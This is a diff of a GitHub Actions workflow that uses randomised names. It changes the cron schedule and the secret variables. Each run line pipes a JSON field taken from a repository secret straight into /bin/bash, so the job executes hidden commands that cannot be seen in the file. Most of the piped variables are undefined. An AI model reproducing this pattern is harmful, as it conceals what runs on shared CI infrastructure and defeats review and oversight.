@@ -3,7 +3,7 @@ name: heziwei6781
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 4/6 * * *'
+    - cron: '42 0/6 * * *'
 
 jobs:
   build:
@@ -12,18 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: heziwei6781
         env:
-          drej263: ${{ secrets.drej263 }}
+          v00: ${{ secrets.v00 }}
         run: |
-          echo $drej263 | jq -r .qc34 | /bin/bash
-          echo $ee62046 | jq -r .hvcx938 | /bin/bash
-          echo $cwl07 | jq -r .l08 | /bin/bash
-          echo $hgka1 | jq -r .j04 | /bin/bash
-          echo $al0 | jq -r .mkgd62831 | /bin/bash
-          echo $zgq5742 | jq -r .dapg69528 | /bin/bash
-          echo $ixm0 | jq -r .gr61 | /bin/bash
-          echo $oot54289 | jq -r .qa330 | /bin/bash
-          echo $ix5108 | jq -r .xp82 | /bin/bash
-          echo $actu2289 | jq -r .yfid8709 | /bin/bash
-          echo $rvzcm30 | jq -r .fhhp41219 | /bin/bash
-          echo $zcbqr982 | jq -r .yps7001 | /bin/bash
+          echo $v00 | jq -r .tgfdd3407 | /bin/bash
+          echo $ky194 | jq -r .px80678 | /bin/bash
+          echo $cm7795 | jq -r .sr5729 | /bin/bash
+          echo $mtbp40586 | jq -r .x22475 | /bin/bash
+          echo $p4 | jq -r .o623 | /bin/bash
+          echo $tqdu14 | jq -r .ncb29144 | /bin/bash
+          echo $j40491 | jq -r .lsa23 | /bin/bash
+          echo $aqg2320 | jq -r .x19465 | /bin/bash
+          echo $ku7 | jq -r .dba45200 | /bin/bash
+          echo $qvblm585 | jq -r .uz074 | /bin/bash
 
